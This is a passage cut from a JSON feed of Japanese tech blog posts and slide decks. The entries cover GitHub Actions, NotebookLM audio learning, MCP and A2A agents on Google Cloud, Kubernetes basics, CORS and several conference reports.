Actionsの「なぜか動く」を分解する：npm publishとGITHUB_TOKEN","link":"https://zenn.dev/meziron/articles/fef6ccca887f97","contentSnippet":"GitHub Actionsの「なぜか動く」を分解する：npm publishとGITHUB_TOKEN最近、非エンジニアの人やエンジニアなりたての人と作業することがあります。そこで自分が組んだGithub Actionsについて質問をもらいました。「このyamlってプログラミング言語じゃないのになんでこういうふうに書くことで動くの？」「初めてみても何が何をしているの全然直観的じゃなくて、これから自分で書ける自信がない・・・」上記のような言葉をもらいました。実際、GitHub Actionsを使っていると、コピペでなんとなく動いてはいるものの、「裏で何が起きているのかよく...","isoDate":"2025-12-01T08:25:59.000Z","dateMiliSeconds":1764577559000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"Instructorの紹介","link":"https://zenn.dev/meziron/articles/2d1a1006851423","contentSnippet":"InstructorライブラリとClean Architectureで実現する型安全なAI統合パターン はじめに近年、業務アプリケーションにAI機能を組み込む事例が急速に増えています。しかし、AIの出力は本質的に不確実性を含むため、従来のWebアプリケーション開発で重視されてきた型安全性や保守性を維持することが課題となっています。本記事では、InstructorライブラリとClean Architectureを組み合わせることで、型安全で保守性の高いAI統合パターンを実現する方法を紹介します。特に、複雑な業務ロジックを持つアプリケーションでAIを活用する際のベストプラクティス...","isoDate":"2025-12-01T08:25:58.000Z","dateMiliSeconds":1764577558000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"学術的根拠から読み解くNotebookLMの音声活用法","link":"https://shu-kob.hateblo.jp/entry/2025/12/01/005741","contentSnippet":"この記事はQiita 3-shake Advent Calendar 2025 シリーズ1日目の記事です。2025年11月22日(土)に、Google Developer Group - DevFest Tokyo 2025があり、その招待制懇親会でLTをさせていただく機会がありました。「学術的根拠から読み解くNotebookLMの音声活用法」というタイトルで、NotebookLMの音声解説で学習する際のポイントを過去のマルチメディア学習の学術的根拠や実験を基にまとめました。 speakerdeck.com1ページずつ解説をさせていただきたいと思います。1枚目1枚目は表紙です2枚目2枚目は自己紹介です。3枚目Notebookでの音声を作る操作方法です。画面にドキュメントなどをアップロードし、音声解説ボタンを押すだけで簡単に作れます。音声は、男女掛け合いのPodcast形式です。4枚目仕事や学業で、難解なドキュメントを読む場面は多々あると思いますが、NotebookLMの音声解説機能により、学習効率が高められるか期待が高まっています。AIによって作られた音声がどれだけ学習効果があるか過去のマルチメディア学習の学術的根拠実験を基に解説していきます。5枚目学習効果を測定する実験も行いました。とある専門的なドキュメントを音声化して実験に用いました。被験者は熟達者（エキスパート）と初学者のグループに分かれます。熟達者、初学者でそれぞれ、音声の元となったドキュメントのみ読んで学習したグループ、音声のみ聴いて学習したグループ、両方を用いたグループに分かれ、学習後に4択の理解度チェックテストを受けてもらいました。GoogleスライドをPDF化して文字が崩れているので、直せるなら直しておきます。6枚目ドキュメント・音声の両方を用いたグループが優位に思えましたが、結果はご覧の通り。初学者は、実験を1回のみ行い、両方 > 音声のみ > ドキュメントのみ、という期待通りの結果でしたが、熟達者は、実験を3回行い、両方グループが最高点を取るとは限りませんでした。なぜ、熟達者は両方グループが優位とは限らなかったのでしょうか？7枚目初学者の説明です。初学者は音声学習を順書立てて勉強するのが有効です。構造的ガイダンスを提供することを足場かけ理論といいます。また、初学者の両方グループは音声を主、ドキュメントを従（文章を読むより、俯瞰的に見る）ことにより、認知負荷分散につながりました。8枚目一方の熟達者の説明です。熟達者は、初学者に有効な順序立てた構造的ガイダンスが邪魔になることがあります。熟達者の知識ネットワークに対して、手厚い構造的ガイダンスが知識をマッピングするのが非常に認知負荷が高いためです。これを熟達化のリバーサル効果といいます。また、熟達者の両方群は音声とドキュメント両方から情報を得ようと頑張り、認知負荷が高い状態でした。9枚目実験の制約により、不利な面もありました。実験の時間の都合上、音声の一時停止、巻き戻しを禁止していました。音声を一時停止、巻き戻して、自分のペースで聴けるなら、熟達者の両方グループは、音声とドキュメント両方からしっかり情報を取れていた可能性があります。学習者のペースを守らせることが効率を上げるのですが、例えば、音声や動画の学習をする際、数分ごとに区切って、学習者が「次へ」を押すことで次のパートが始まると学習がしやすいです。このことを「セグメンテーション原理」と呼ぶのですが、実験の制約上、阻害されたことになります。また、熟達者の実験の中で、音声のみグループの平均点が低いときがありました。それは、グラフ・図を見ていないと難しい問題が多く、音声でグラフ・図など視覚的な情報伝達が難しいことを意味します。また、各グループの点数のばらつきでは、ドキュメントのみグループが最も大きかったです。これは当然と言えば当然で、ドキュメント学習は各個人の学習能力に大きく左右されるためです。一方、音声は画一的な指導が可能とも言えます。10枚目実験や学術的根拠から読み解く、音声学習のおすすめとしては、学習者の習熟度を考慮し、初学者は音声とドキュメント両方を併用し、音声を主、ドキュメントを従とするのが良いでしょう。一方、熟達者は各個人で使い分けをするのがよく、概要把握や復習、思い出すなどの目的では音声、詳細や図表の把握はドキュメントを使うのがよく、安易に両方同時に使うと認知負荷を増大させるリスクがあります。11枚目参考文献です。一部、有料のものもありますが、Web検索等で概要を知ることもできます。12枚目終わりましたが、他の勉強会での登壇情報です。2025年11月27日(木)に、Jagu\'e\'r 月末 Tech Lunchの勉強会「月末 Tech Lunch Online#7 - Google Cloud を語る！-」に「MCP・A2A概要 〜Google Cloudで構築するなら〜」というタイトルで登壇した話は、ブログ記事にまとめていますので、よろしければご覧ください。shu-kob.hateblo.jp最後にqiita.com3-shake Advent Calendar 2025 シリーズ2の1日目はmasasuzuさんが書いてくれています。シリーズ1の2日目はyteraokaさんの「VPC Lattice を理解したい」シリーズ2の2日目はnwiizoさんの「生成AIエージェントによるブログレビュー環境の構築（上）」です。今後もお楽しみに！","isoDate":"2025-11-30T15:57:41.000Z","dateMiliSeconds":1764518261000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"MCP・A2A概要 〜Google Cloudで構築するなら〜","link":"https://shu-kob.hateblo.jp/entry/2025/12/01/001432","contentSnippet":"この記事はQiita Jagu\'e\'r Advent Calendar 2025の1日目の記事です。2025年11月27日(木)に、Jagu\'e\'r 月末 Tech Lunchの勉強会「月末 Tech Lunch Online#7 - Google Cloud を語る！-」に「MCP・A2A概要 〜Google Cloudで構築するなら〜」というタイトルで登壇させていただきましたので、その発表内容でのポイントを記事化したいと思います。AIエージェントが流行っているけど、MCPやA2Aという概念は難しいやろうと思い、噛み砕いて説明したいというのが発表のモチベーションでした。 speakerdeck.comなお、今回の資料は、NotebookLMで作成しました。ここまで作れるのはすごいです！1ページずつ解説をさせていただきたいと思います。1枚目1枚目は表紙です。2枚目2枚目は、アジェンダで、全体の話の流れを書いています。3枚目3枚目は、LLMの制約について述べています。LLMは「Brain in a Jar」（瓶の中の脳）とも言われ、賢いけど、手足を持たなくて実行能力のないものの例えです。例えば、学習時点までの知識しか知りません。これをナレッジカットオフといいます。「今日の株価」「明日の天気」「最新のニュース」などは分かりません。また、旅行のプランをLLMに尋ねても、航空券やホテルの予約はしてくれません。APIなどを操作し、データベースのトランザクション操作をする実行能力はないのです。4枚目ここで、LLMの制約を解決する手段として、MCPの話が出てくるのに加え、さらなる機能拡張のためにA2Aの話が出てきます。MCPはLLMに実行能力を与えます。A2Aはエージェント同士が連携し、より複雑なことができるようになる仕組みです。5枚目MCP(Model Context Protocol)は外部ツールやデータへのアクセスを標準化するプロトコルです。LLMという脳に手足を与えて、検索やAPI操作ができるようになり、APIを介してデータベースのトランザクション操作ができるようになるのです。ここでポイントは、推論機能と実行機能を分離して疎結合に実装するということです。6枚目A2A(Agent-to-Agent)は、AIエージェント同士で、連携するためのプロトコルです。能力を記述したAgent CardがAIエージェントの名刺となり、どのエージェントにどのタスクを任せるかの判断ができます。また、通信プロトコルが定められているため、拡張性に優れています。7枚目MCPとA2Aのご紹介をしましたが、Google CloudでMCPやA2Aをどう構築していくかのポイントに移りましょう。まず、認知（推論）機能と実行機能を分離することクラウドを利用する上で、サーバーレスファーストが大事であること（8枚目で詳説）誰も信頼せずとも動くゼロトラストセキュリティであることです。8枚目Google CloudでのMCPサーバー構築は、Cloud Runを使うのが定石です。サーバーレスでありコスト最適化できます。また、高いスケーラビリティに対応していて、コンテナベースで、デプロイが容易です。9枚目MCPサーバーをCloud Runで構築する際の注意点です。ローカル開発で使うようなstdio（Standard I/O）はCloud Runでは使用できないため、Streamable HTTPかSSE over HTTPを使う必要があります。最近では、新しいStreamable HTTPの方が推奨となっています。10枚目一方、A2A対応のエージェントの構築は、Vertex AI Agent Engineが最適です、フルマネージドサービスで、A2Aのプロトコルに準拠しており、Agent Registoryによるガバナンスも効いています。11枚目A2Aエージェントを構築するためのポイントです。スライドには文言が書いていませんが、ADK(Agent Development Kit)を用いた方法です。AgentCardの定義、使用するLLMやツールの定義、タスク処理のロジックを実装し、これらをA2Agentで統合し、A2A準拠のエージェントを作成できます。12枚目MCPとA2Aを連携させた構築例です。「Social Agent」というのは友人の好みを推論するエージェントです。外部連携、つまり実行部分はMCPを用いて、推論と実行の分離を行います。13枚目簡単にAIエージェントが開発できるようになると、企業内でみんな好き勝手にエージェントを作り始めて、野良エージェントが増えそうですが、Gemini Enterpriseによる一元管理でガバナンスを効かせられます。14枚目MCPもA2Aもオープンプロトコルであるため、拡張性に優れています。インターネットでもTCP/IPというオープンプロトコルのおかげで相互運用性があるように、AIエージェントもどんどん拡張していき、どんどん便利な世の中になるのかもしれません。最後にお読みいただきありがとうございました。2日目のQiita Jagu\'e\'r Advent Calendar 2025は、pHaya72さん「テクサミの宣伝」です。qiita.com空きもまだありますので、Jagu\'e\'r 会員の方はぜひ書きましょう！私もできれば、複数記事書きます！","isoDate":"2025-11-30T15:14:32.000Z","dateMiliSeconds":1764515672000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"【小ネタ】pytest-bddを使ってみた","link":"https://dev.mix64.com/2025/11/30/pytest-bdd/","contentSnippet":"はじめに 今回は pytest-bdd ついて紹介します。名前の通り BDD（Behavior Driven Development, テス...","isoDate":"2025-11-30T11:15:35.000Z","dateMiliSeconds":1764501335000,"authorName":"ayibote","authorId":"ayibote"},{"title":"【解説】コード生成の最適化によるLinuxコンテキストスイッチの改善パッチ","link":"https://dev.mix64.com/2025/11/29/optimize-code-generation-during-context-switching/","contentSnippet":"はじめに 今回は2025年11月にXie Yuanbin氏によって提案された一連のパッチシリーズ「Optimize code generat...","isoDate":"2025-11-29T14:45:43.000Z","dateMiliSeconds":1764427543000,"authorName":"ayibote","authorId":"ayibote"},{"title":"名前が似てる LookerとLooker Studioの違いとは?","link":"https://sreake.com/blog/differences-between-looker-and-looker-studio/","contentSnippet":"はじめに こんにちは。 以前、Looker、LookMLについての記事を投稿してからしばらく経ちました。 今は生成AIの登場により、Lookerも様々な機能追加や活用の場が増えてきています。 それと同時に、このような言葉 […]The post 名前が似てる LookerとLooker Studioの違いとは? first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-11-28T02:32:06.000Z","dateMiliSeconds":1764297126000,"authorName":"Sreake","authorId":"Sreake"},{"title":"MCP・A2A概要 〜Google Cloudで構築するなら〜","link":"https://speakerdeck.com/shukob/mcpa2agai-yao-google-clouddegou-zhu-surunara","contentSnippet":"「Jagu\'e\'r 月末 Tech Lunch Online#7 - Google Cloud を語る！-」にて、\\rAIエージェントのMCPとA2Aの概要と、それらをGoogle Cloudで構築する上でのTipsを紹介させていただきました。\\rhttps://jaguer-tech-lunch.connpass.com/event/362363/","isoDate":"2025-11-27T05:00:00.000Z","dateMiliSeconds":1764219600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"AIエージェントの自律性と協調性を解放する Google CloudによるMCP・A2A実装のエンタープライズ戦略","link":"https://speakerdeck.com/shukob/20251125-ri-ben-sheng-cheng-aiyusahui-xiao-yuan-part2","contentSnippet":"2025年11月25日の日本生成AIユーザ会「#19 MCP・A2A概要 〜Google Cloudで構築するなら〜」にて発表に使用した資料2部あるうちの後半部分です。\\rhttps://genai-users.connpass.com/event/376260/\\r\\r↓前半部分はこちらです\\rhttps://speakerdeck.com/shukob/aiezientoru-men-zi-lu-xing-noji-chu-karaopunpurotokorumcpa2aniyorulian-xi-made","isoDate":"2025-11-25T05:00:00.000Z","dateMiliSeconds":1764046800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"AIエージェント入門 自律性の基礎からオープンプロトコルMCP・A2Aによる連携まで","link":"https://speakerdeck.com/shukob/aiezientoru-men-zi-lu-xing-noji-chu-karaopunpurotokorumcpa2aniyorulian-xi-made","contentSnippet":"2025年11月25日の日本生成AIユーザ会「#19 MCP・A2A概要 〜Google Cloudで構築するなら〜」にて発表に使用した資料2部あるうちの前半部分です。\\rhttps://genai-users.connpass.com/event/376260/\\r\\r↓後半部分はこちらです\\rhttps://speakerdeck.com/shukob/20251125-ri-ben-sheng-cheng-aiyusahui-xiao-yuan-part2","isoDate":"2025-11-25T05:00:00.000Z","dateMiliSeconds":1764046800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"学術的根拠から読み解くNotebookLMの音声活用法","link":"https://speakerdeck.com/shukob/xue-shu-de-gen-ju-karadu-mijie-kunotebooklmnoyin-sheng-huo-yong-fa","contentSnippet":"2025年11月22日(土)に開催された「Google Developer Group - DevFest Tokyo 2025」の懇親会LTで発表させていただきました。\\rhttps://gdg-tokyo.connpass.com/event/369416/\\r\\rNotebookLMで音声解説(Podcast)機能がありますが、初学者と上級者でドキュメントでの学習とどのように使い分けたら学習効率がいいかなどを、実験結果と複数の学術的根拠を元に解説しました。","isoDate":"2025-11-22T05:00:00.000Z","dateMiliSeconds":1763787600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"CODEBLUE2025参加したらキラキラで眩しかった","link":"https://www.rowicy.com/blog/codeblue2025-summary-repo/","contentSnippet":"CODEBLUE2025の参加レポ(全体)","isoDate":"2025-11-22T00:00:00.000Z","dateMiliSeconds":1763769600000,"authorName":"riiim","authorId":"riiim"},{"title":"2025-11-21 社内エンジニア勉強会 改めて理解するVPC Endpoint","link":"https://speakerdeck.com/masasuzu/2025-11-21-she-nei-enziniamian-qiang-hui-gai-meteli-jie-suruvpc-endpoint","contentSnippet":"社内勉強会で発表したVPC Endpointの説明資料","isoDate":"2025-11-21T05:00:00.000Z","dateMiliSeconds":1763701200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Google Cloud で目指す クラウド二刀流エンジニア講座第3回に登壇してきました。","link":"https://blog.masasuzu.net/entry/2025/11/16/203546","contentSnippet":"11/14に Google Cloudで目指すクラウド二刀流エンジニア講座第3回 に登壇してきました。cloudonair.withgoogle.com第1回でパネルディスカッションに出てきたのに引き続き、今回は Fargate との差分で理解する、Cloud Run のシンプルな魅力 と題して登壇させていただきました。AWSをもうすでに使ってる方向けにECS Fargateと比較しつつCloud Runのシンプルな魅力を紹介するセッションとなっていました。視聴登録すればこちらから動画が見れるかと思います。資料も後ほどこちらに上がると思います。内容としては以下のような話をしました。Cloud Runの概要紹介ECS FargateとCloud Runのアプリケーションアーキテクチャ比較ネットワーク機能の紹介セキュリティ機能の紹介運用監視機能の紹介今回はCloud Runを使ってない人向けに概要紹介するセッションだったので、深入りできていない部分や説明不足、端折ったところがたくさんあります。これについてはどこかでエントリ書きたいと思ってます。とにかくCloud Runはいいぞ!ということが伝わっていれば何よりです。Cloud Runの良さを伝えたつもりですが、あくまでなんでも適材適所でFargateが向いているコンテキストに無理やり変える必要はなく、比較検討できる選択肢の一つとしてCloud Runを入れていただけたらと思います。スライドにもう少し図表を入れた方が伝わったかなとか反省点はありつつも、40分トークは初めてだったのですごくいい経験になりました。今後ももっと大きなところで登壇できるように精進していきます。","isoDate":"2025-11-16T11:35:46.000Z","dateMiliSeconds":1763292946000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Gemini Enterprise でエージェントの登録方法が変わったので、前のエージェントを削除する方法","link":"https://sreake.com/blog/how-to-delete-previous-gemini-enterprise-agent/","contentSnippet":"前置き こんばんは Sreake 事業部の佐藤慧太@SatohJohnです。 Gemini Enterprise のお話です。Gemini Enterprise の管理画面では以下のような画面で「エージェント」して追加、 […]The post Gemini Enterprise でエージェントの登録方法が変わったので、前のエージェントを削除する方法 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-11-14T01:00:21.000Z","dateMiliSeconds":1763082021000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Claude Code で体験するAIコーディング。GitHub CopilotやCursorとの違いは？","link":"https://sreake.com/blog/ai-coding-with-claude-code/","contentSnippet":"はじめに ここ数年で、ソフトウェア開発におけるAI活用は急速に進んでいます。特に「AIコーディング支援ツール」は、プログラマーの生産性を高める実用的な手段として注目を集めています。 GitHub CopilotやCurs […]The post Claude Code で体験するAIコーディング。GitHub CopilotやCursorとの違いは？ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-11-13T08:35:30.000Z","dateMiliSeconds":1763022930000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Black Hat USA 2025 Recap ~ クラウドセキュリティ編 ~","link":"https://speakerdeck.com/kyohmizu/black-hat-usa-2025-recap-kuraudosekiyuriteibian","contentSnippet":"イベント登壇資料です。2025/11/12 CloudSec JP #004\\rhttps://cloudsecjp.connpass.com/event/371229/","isoDate":"2025-11-12T05:00:00.000Z","dateMiliSeconds":1762923600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"k8s超入門: 基本的なコンポーネントの概要まとめ","link":"https://zenn.dev/takehiro1111/articles/kubernetes_basic","contentSnippet":"1.記事を書いた背景業務でEKSの環境を構築しており、知識を補完,整理するために記事として残しています。公式のチュートリアルをサクッとレベルで対応しながら書いてます。 2.対象読者Kubernetes初学者,未経験者(自分みたいな) 書くことイメージしやすい範囲でk8sコンポーネントの概要今の時点で深入りしてもよく分からんってなるので、概要レベルのみの記述です。手を動かして実際のデプロイ環境を作る際に細かい書き方とか機能を必要に応じて調べれば良い。 書かないこと詳細レベルやプラグイン等の解説EKS,GKE等のクラウドプロバイダ特有の設定...","isoDate":"2025-11-09T06:48:49.000Z","dateMiliSeconds":1762670929000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Vertex AI Agent Engine を運用していくうえでのノウハウ","link":"https://sreake.com/blog/know-how-to-operate-vertex-ai-agent-engine/","contentSnippet":"1. はじめに はじめまして、Sreake事業部の井上 秀一です。私はSreake事業部にて、SREや生成AIに関するResearch & Developmentを行っています。本記事は、Google Cloud […]The post Vertex AI Agent Engine を運用していくうえでのノウハウ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-11-07T09:42:52.000Z","dateMiliSeconds":1762508572000,"authorName":"Sreake","authorId":"Sreake"},{"title":"2025-11-08 Security JAWS TerraformによるIAM Policy記述ガイド","link":"https://speakerdeck.com/masasuzu/2025-11-08-security-jaws-terraformniyoruiam-policyji-shu-gaido","contentSnippet":"[[IAMスペシャル！]Security-JAWS【第39回】 勉強会 2025年11月08日(土) - connpass](https://s-jaws.connpass.com/event/366395/) の発表資料","isoDate":"2025-11-07T05:00:00.000Z","dateMiliSeconds":1762491600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Redux基礎: APIをfetchして非同期でデータを表示する処理","link":"https://zenn.dev/takehiro1111/articles/react_redux_async_thunk","contentSnippet":"1.記事を書いた背景初めてReduxを触っているのですが、独特で慣れが必要だなと感じたのでコンポーネントを整理するにあたり、形として残しておきたかったためです。Reduxに不慣れな方のご参考にもなれば幸いです。 2.書くこと各コンポーネントの説明APIをfetchしてデータ表示する処理のコード 3.Reduxとは？Reduxは、アプリケーション全体の状態を管理および更新するためのパターンとライブラリです。UIは「アクション」と呼ばれるイベントをトリガーして何が起こったかを伝え、それに応じて「リデューサー」と呼ばれる別の更新ロジックが状態を更新します。Redu...","isoDate":"2025-11-03T03:43:35.000Z","dateMiliSeconds":1762141415000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Observability Conference Tokyo 2025に参加してきました！","link":"https://sreake.com/blog/o11y-con-tokyo-2025/","contentSnippet":"はじめに 3-shakeで マーケティング・ブランディングを行なっている永瀬です。 2025/10/27に Observability Conference Tokyo 2025 が開催されましてスリーシェイクもスポンサ […]The post Observability Conference Tokyo 2025に参加してきました！ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-31T09:21:45.000Z","dateMiliSeconds":1761902505000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Gemini Enterprise（旧Google Agentspace）を活用する","link":"https://sreake.com/blog/get-started-with-gemini-enterprise/","contentSnippet":"Gemini Enterprise（旧Google Agentspace）の概要 2025/10/10まではGoogle Agentspaceと呼ばれていたGoogle AIアシスタントサービスのサービス名称変更が行われ […]The post Gemini Enterprise（旧Google Agentspace）を活用する first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-31T01:22:38.000Z","dateMiliSeconds":1761873758000,"authorName":"Sreake","authorId":"Sreake"},{"title":"【初心者向け】Snowflakeロールベースアクセス制御（RBAC）解説","link":"https://sreake.com/blog/learn-about-snowflake-role-based-access-control/","contentSnippet":"はじめに Snowflakeでデータ分析基盤を構築するうえで、最も重要な要素の一つがロール管理です。これはデータガバナンスの活動の第一歩の位置付けでもあり、さらにはある程度成熟された基盤の状態からロールを再設計するコスト […]The post 【初心者向け】Snowflakeロールベースアクセス制御（RBAC）解説 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-31T01:21:49.000Z","dateMiliSeconds":1761873709000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Trayce, a Raycast Extension for Tokyo AI Hackathon 2025","link":"https://speakerdeck.com/ota1022/trayce-a-raycast-extension-tokyo-ai-hackathon-2025","contentSnippet":"The pitch deck for a Raycast extension called Trayce, created at the Tokyo AI Hackathon.\\rhttps://raycast.connpass.com/event/369928/","isoDate":"2025-10-30T04:00:00.000Z","dateMiliSeconds":1761796800000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"WebSocket入門：GoでEcho/Chat機能を実装してみた","link":"https://zenn.dev/takehiro1111/articles/go_web_socket","contentSnippet":"1.記事を書いた背景WebSocket の実装が初めてだったこともあり、頭の中を整理しておこうと思い記事にしました。全然関係ないですが、1 年くらい前にプロダクトへサーバレス構成でチャット機能を実装する時にインフラ側の基盤を作ったのが懐かしく感じました。 2.対象読者WebSocket って聞いたことあるけど何だっけという方(自分みたいな)実装レベルで気になる方(自分みたいな) 3.WebSocket とは？WebSocket API は、ユーザーのブラウザーとサーバー間で対話的な通信セッションを開くことができるものです。この API を使用すると、サーバー...","isoDate":"2025-10-30T02:43:23.000Z","dateMiliSeconds":1761792203000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Astro で Standard ML のシンタクスハイライト","link":"https://silasol.la/posts/2025-10-26-02_astro-sml/","contentSnippet":"デフォルトでハイライトされない言語を TextMate を用いた拡張で認識させます．","isoDate":"2025-10-26T00:00:00.000Z","dateMiliSeconds":1761436800000,"authorName":"Masaki Haga","authorId":"silasolla"},{"title":"anyenvやasdfに代わる？miseで始める開発環境管理","link":"https://sreake.com/blog/mise-development-env-management/","contentSnippet":"はじめに 開発環境の構築において「このプロジェクトは Node.js 16 系だけど、別の案件は 18 系じゃないと動かない」といった状況に遭遇することは少なくありません。 プロジェクトごとに異なる言語やツールのバージョ […]The post anyenvやasdfに代わる？miseで始める開発環境管理 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-24T12:34:35.000Z","dateMiliSeconds":1761309275000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Go + React(TypeScript)の実装で理解するCORS","link":"https://zenn.dev/takehiro1111/articles/go_cors_implement","contentSnippet":"1.記事を書いた背景私はインフラ側の経験が主ですが、開発チームから依頼されてS3のCORS許可ポリシーを設定することが何度かありました。ただ、その度に調べて何となく理解し直すということを繰り返していてインフラ視点での理解に留まっていて少しモヤのある状態でした。（実際にアプリ側の実装を行い、いくつかの実装パターンがあるという点も把握しないと感覚的な理解が得にくい設定だと思います。）今回、GoのAPI開発を通してアプリケーション側でCORSを実装したことでより深く理解できたので、自分の知識を整理する目的で本記事をまとめています。 2.対象読者CORSの概念や設定について...","isoDate":"2025-10-23T08:42:30.000Z","dateMiliSeconds":1761208950000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Gemini CLI でセキュアで堅牢な開発をするためのプラクティス集","link":"https://zenn.dev/kimitsu/articles/secure-and-robust-development-with-gemini-cli","contentSnippet":"先日、クラウドネイティブ \xd7 Gemini CLIというイベントで『Gemini CLI でもセキュアで堅牢な開発をしたい！』というタイトルで登壇させていただきました。時間都合で端折ってしまった部分が多かったため、本記事で行間を埋めつつ最新の状況をお伝えします。登壇の内容は全て記載するため、イベントに参加されなかった方も読んでいただければと思います。 はじめに本記事は Gemini CLI を個人レベルではなく企業やチームとして使いたい方を対象とします。そのため、Gemini CLI の基本的な部分（例えばどのようにインストールするか、settings.jsonとは何か、基本...","isoDate":"2025-10-23T01:52:31.000Z","dateMiliSeconds":1761184351000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Go/Ginでslogを使ったロギングのミドルウェア実装","link":"https://zenn.dev/takehiro1111/articles/go_gin_logger","contentSnippet":"1.記事を書いた背景自分の整理用とこんな書き方もあるんだ程度に参考になればと思い記事に起こしています。実装を進める中で変なスイッチも入り、様々な機能を追加していきました。結果的にリクエストボディのマスキングや分散トレーシングのためのリクエストID生成など、本番環境での使用を一定想定した機能を実装しました。 2.機能要件箇条書きで見づらいと思いますが、以下の機能を付け足してます。- ミドルウェアとして実装してラップすることで全てのエンドポイントに適用できる。- 時刻等の可変性のある設定については、依存性を注入し実装すること。  - テストコードでMockを...","isoDate":"2025-10-21T09:05:31.000Z","dateMiliSeconds":1761037531000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Gemini CLIでもセキュアで堅牢な開発をしたい！","link":"https://speakerdeck.com/yunosukey/gemini-clidemosekiyuadejian-lao-nakai-fa-wositai","contentSnippet":"","isoDate":"2025-10-19T04:00:00.000Z","dateMiliSeconds":1760846400000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"GitHub Actions の Job から WireGuard で VPN アクセス","link":"https://qiita.com/yteraoka/items/eef62dc05aa96fbed3b6","contentSnippet":"背景GitHub Actions の Job で家のネットワークにアクセスさせたいことがあり、いったんは Squid を認証付きで publilc に公開するというのをやっていたのですが、やっぱり嬉しくないのでどうしたものかと思っていたのですが WireGuard が使...","isoDate":"2025-10-18T09:09:27.000Z","dateMiliSeconds":1760778567000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"AIエージェント入門 〜基礎からMCP・A2Aまで〜","link":"https://speakerdeck.com/shukob/aiezientoru-men-ji-chu-karamcpa2amade","contentSnippet":"https://genai-users.connpass.com/event/373059/\\r2025年10月18日、オープンソースカンファレンス2025 Online/Fallで発表した資料です。\\r\\r今話題となっている「AIエージェント」について、要素技術となる生成AIを用いてどのように自律的に動作するのか基礎を説明した後、AIが外部のツールやデータにアクセスするためのオープンプロトコルであるMCP（Model Context Protocol）や、複数のエージェントによる分業と連携を可能にするオープンプロトコルA2A（Agent-to-Agent）について解説しました。","isoDate":"2025-10-18T04:00:00.000Z","dateMiliSeconds":1760760000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"英語4文字のセキュリティ用語あれこれ説明できる？ - SBOM/SAST/DAST...","link":"https://zenn.dev/r4ynode/articles/security-english-words","contentSnippet":"セキュリティの話になると、謎の4文字くらいの英語が羅列しているのを見たことありません？それらのセキュリティ用語を説明できますか？私はできません多すぎて分からなくなるので少し整理します。!内容は概要程度です。機能面についても利用するソフトウェアやベンダーに依存するため参考程度に。 早見表用語一言解説SBOMソフトウェア部品表。構成要素を一覧化する。SCAOSSやライブラリの脆弱性・ライセンス管理。ASTアプリの脆弱性を検出するセキュリティテスト。SASTソースコードを静的解析して脆弱性検出。DAST実行中アプリに攻撃して...","isoDate":"2025-10-18T03:00:01.000Z","dateMiliSeconds":1760756401000,"authorName":"Reito Koike","authorId":"reito"},{"title":"ディレクトリ構成 ~ハイブリッド型編~","link":"https://sreake.com/blog/hybrid-directory-structure-good-practice/","contentSnippet":"はじめに アプリケーション開発において、ディレクトリ構成は保守性・拡張性・開発効率に直結する設計要素です。 本記事では、ディレクトリ構成に悩む現場に向けて、ハイブリッド型構成をご紹介します。 ⚠️ この構成が「唯一の正解 […]The post ディレクトリ構成 ~ハイブリッド型編~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-16T04:41:28.000Z","dateMiliSeconds":1760589688000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Prometheus + Step Functions + Lambdaで構築するサーバレスオンコール基盤","link":"https://zenn.dev/nextbeat/articles/oncall_architecture_nb","contentSnippet":"1. 前提 ブログを書いた背景Lambda のランタイムバージョン更新対応に携わる中で、既存のオンコール基盤のリファクタリングと改修を実施しました。具体的な実装や要件ははあまり記述していませんが、アーキテクチャの参考例になればと思いブログに起こしました。 オンコール体制の方針弊社では全員 CTO というテーマを掲げて、各エンジニアが主体的に事業及びプロダクトに関わる文化を醸成しています。それに伴い、オンコール体制もエンジニア全員が参加する体制をとっています。全員CTOとは？と気になる方はEntrance Book覗いてみてください\uD83D\uDE04https://note....","isoDate":"2025-10-14T06:25:59.000Z","dateMiliSeconds":1760423159000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"TFLintカスタムプラグインで始める Terraformコード品質管理","link":"https://speakerdeck.com/bells17/tflintkasutamupuraguindeshi-meru-terraformkodopin-zhi-guan-li","contentSnippet":"Go Night Talks – After Conference の 